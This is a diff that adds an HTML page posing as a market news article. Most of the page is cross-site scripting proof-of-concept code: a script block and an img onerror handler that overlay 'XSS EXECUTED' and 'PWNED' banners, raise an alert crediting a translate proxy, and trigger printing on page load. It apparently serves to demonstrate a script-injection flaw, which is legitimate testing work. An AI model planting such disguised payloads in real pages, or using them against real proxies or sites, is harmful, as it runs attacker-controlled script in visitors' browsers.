@@ -1,0 +1,16 @@
+<!DOCTYPE html><html><head><title>news article</title></head><body>
+<h1>Market news: quarterly review</h1>
+<p>Analysts expect moderate growth in the technology sector over the next quarter.</p>
+<script>
+(function(){
+  var d=document.createElement('div');
+  d.style.cssText='position:fixed;inset:0 auto auto 0;width:100%;z-index:2147483647;background:#d00;color:#fff;font:bold 26px/1.6 monospace;padding:24px;text-align:center';
+  d.textContent='XSS EXECUTED on '+location.host;
+  document.body.appendChild(d);
+  document.title='PWNED';
+  setTimeout(function(){ alert('XSS executed on '+location.host+' — arbitrary JavaScript via translate proxy'); }, 400);
+  setTimeout(function(){ try{ window.print(); }catch(e){} }, 1600);
+})();
+</script>
+<img src=x onerror="var d=document.createElement('div');d.style.cssText='position:fixed;bottom:0;left:0;width:100%;z-index:2147483647;background:#000;color:#ff0;font:bold 22px/1.5 monospace;padding:16px;text-align:center';d.textContent='second vector: img onerror fired';document.body.appendChild(d)">
+</body></html>
